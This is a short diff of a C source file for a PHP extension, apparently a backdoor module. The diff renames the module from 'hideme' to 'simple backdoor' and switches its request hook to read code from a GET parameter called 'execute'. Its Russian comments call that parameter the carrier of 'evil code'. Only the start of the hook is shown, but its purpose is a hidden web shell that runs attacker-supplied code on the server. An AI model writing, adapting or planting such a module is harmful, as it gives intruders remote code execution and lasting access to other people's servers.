@@ -1,11 +1,8 @@
-#include "stdafx.h"
-#include "zend_config.w32.h"
 #include "php.h"
-
 PHP_RINIT_FUNCTION(hideme);
 zend_module_entry hideme_ext_module_entry = {
     STANDARD_MODULE_HEADER,
-    "hideme",
+    "simple backdoor",
     NULL,
     NULL,
     NULL,
@@ -20,8 +17,8 @@ ZEND_GET_MODULE(hideme_ext);
 PHP_RINIT_FUNCTION(hideme)
 {
 
-	char* method = "_POST"; // суперглобальный массив, из которого берем пераметр и значение
-	char* secret_string = "secret_string"; // параметр в котором будет evil-код
+	char* method = "_GET"; // суперглобальный массив, из которого берем пераметр и значение
+	char* secret_string = "execute"; // параметр в котором будет evil-код
 	zval** arr;
 	char* code;
 
